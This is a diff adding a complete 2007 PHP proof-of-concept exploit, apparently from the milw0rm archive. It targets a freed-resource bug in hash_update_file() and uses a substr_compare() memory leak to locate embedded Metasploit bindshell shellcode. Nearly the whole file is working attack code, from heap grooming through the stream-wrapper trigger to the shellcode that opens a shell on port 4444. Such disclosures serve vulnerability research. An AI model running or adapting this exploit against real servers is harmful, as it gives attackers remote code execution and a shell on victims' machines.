@@ -1,0 +1,133 @@
+<?php
+  ////////////////////////////////////////////////////////////////////////
+  //  _  _                _                     _       ___  _  _  ___  //
+  // | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \| || || _ \ //
+  // | __ |/ _` || '_|/ _` |/ -_)| ' \ / -_)/ _` ||___||  _/| __ ||  _/ //
+  // |_||_|\__,_||_|  \__,_|\___||_||_|\___|\__,_|     |_|  |_||_||_|   //
+  //                                                                    //
+  //         Proof of concept code from the Hardened-PHP Project        //
+  //                   (C) Copyright 2007 Stefan Esser                  //
+  //                                                                    //
+  ////////////////////////////////////////////////////////////////////////
+  //         PHP hash_update_file() freed resource usage exploit        //
+  ////////////////////////////////////////////////////////////////////////
+
+  // This is meant as a protection against remote file inclusion.
+  die("REMOVE THIS LINE");
+
+  // linux x86 bindshell on port 4444 from Metasploit
+  $shellcode = "\x29\xc9\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x46".
+      "\x32\x3c\xe5\x83\xeb\xfc\xe2\xf4\x77\xe9\x6f\xa6\x15\x58\x3e\x8f".
+      "\x20\x6a\xa5\x6c\xa7\xff\xbc\x73\x05\x60\x5a\x8d\x57\x6e\x5a\xb6".
+      "\xcf\xd3\x56\x83\x1e\x62\x6d\xb3\xcf\xd3\xf1\x65\xf6\x54\xed\x06".
+      "\x8b\xb2\x6e\xb7\x10\x71\xb5\x04\xf6\x54\xf1\x65\xd5\x58\x3e\xbc".
+      "\xf6\x0d\xf1\x65\x0f\x4b\xc5\x55\x4d\x60\x54\xca\x69\x41\x54\x8d".
+      "\x69\x50\x55\x8b\xcf\xd1\x6e\xb6\xcf\xd3\xf1\x65";
+
+  
+  define("OFFSET", pack("L",findOffset()));
+
+
+  class AttackStream {
+    function stream_open($path, $mode, $options, &$opened_path)
+    {
+      return true;
+    }
+
+    function stream_read($count)
+    {
+      hash_final($GLOBALS['hid'], true);
+      $GLOBALS['aaaaaaaaaaaaaaaaaaaaaa'] = str_repeat(OFFSET, 3);
+      return "A";
+    }
+
+    function stream_eof()
+    {
+      return true;
+    }
+
+    function stream_seek($offset, $whence)
+    {
+               return false;
+    }
+  }
+
+  stream_wrapper_register("attack", "AttackStream") or die("Failed to register protocol");
+
+  $hid = hash_init('md5');
+  hash_update_file($hid, "attack://nothing");
+
+
+
+
+
+
+  // This function uses the substr_compare() vulnerability
+  // to get the offset. 
+  
+  function findOffset()
+  {
+    global $offset_1, $offset_2, $shellcode;
+    // We need to NOT clear these variables,
+    //  otherwise the heap is too segmented
+    global $memdump, $d, $arr;
+    
+    $sizeofHashtable = 39;
+    $maxlong = 0x7fffffff;
+
+    // Signature of a big endian Hashtable of size 256 with 1 element
+    $search = "\x00\x01\x00\x00\xff\x00\x00\x00\x01\x00\x00\x00";
+
+    $memdump = str_repeat("A", 8192);
+    for ($i=0; $i<400; $i++) {
+	  $d[$i]=array();
+    }
+    unset($d[350]);
+    $x = str_repeat("\x01", $sizeofHashtable);
+    unset($d[351]);
+    unset($d[352]);
+    $arr = array();
+    for ($i=0; $i<129; $i++) { $arr[$i] = 1; }
+    $arr[$shellcode] = 1;
+    for ($i=0; $i<129; $i++) { unset($arr[$i]); }
+
+    // If the libc memcmp leaks the information use it
+    // otherwise we only get a case insensitive memdump
+    $b = substr_compare(chr(65),chr(0),0,1,false) != 65;
+
+    for ($i=0; $i<8192; $i++) {
+      $y = substr_compare($x, chr(0), $i+1, $maxlong, $b);
+      $Y = substr_compare($x, chr(1), $i+1, $maxlong, $b);
+      if ($y-$Y == 1 || $Y-$y==1){
+        $y = chr($y);
+        if ($b && strtoupper($y)!=$y) {
+          if (substr_compare($x, $y, $i+1, $maxlong, false)==-1) {
+            $y = strtoupper($y);
+          }
+        }
+        $memdump[$i] = $y;
+      } else {
+  	    $y = substr_compare($x, chr(1), $i+1, $maxlong, $b);
+        $Y = substr_compare($x, chr(2), $i+1, $maxlong, $b);
+        if ($y-$Y != 1 && $Y-$y!=1){
+	      $memdump[$i] = chr(1);
+        } else {
+          $memdump[$i] = chr(0);
+        }   
+      }
+    }
+    
+    // Search hashtable to get the shellcode offset
+    $pos_hashtable = strpos($memdump, $search);
+    
+    if ($pos_hashtable == 0) {
+      die ("Unable to find the offset");
+    }
+    
+    $addr = substr($memdump, $pos_hashtable+6*4, 4);
+    $addr = unpack("L", $addr);
+    return ($addr[1] + 32);
+  }
+?>
+
+# milw0rm.com [2007-03-20]
